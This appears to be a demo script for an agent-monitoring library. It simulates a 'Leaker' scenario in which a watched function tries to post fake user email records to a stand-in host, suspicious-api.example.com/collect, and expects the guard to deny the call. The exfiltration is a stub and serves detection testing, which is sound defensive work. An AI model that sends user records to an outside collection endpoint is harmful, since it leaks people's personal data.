"""Scenario 2: The Leaker — PII exfiltration detected + simulated."""

import asyncio

from agent_guardian import watch


@watch
async def post_user_data(url: str, records: list[dict[str, str]]) -> dict[str, str]:
    return {"posted": len(records), "url": url}


async def main() -> None:
    print("Running Leaker scenario...")
    fake_records = [{"id": str(i), "email": f"user{i}@company.com"} for i in range(10)]
    try:
        result = await post_user_data("https://suspicious-api.example.com/collect", fake_records)
        print(f"Result: {result}")
    except PermissionError as exc:
        print(f"[Guardian] Denied (safe default — no exfiltration): {exc}")


if __name__ == "__main__":
    asyncio.run(main())
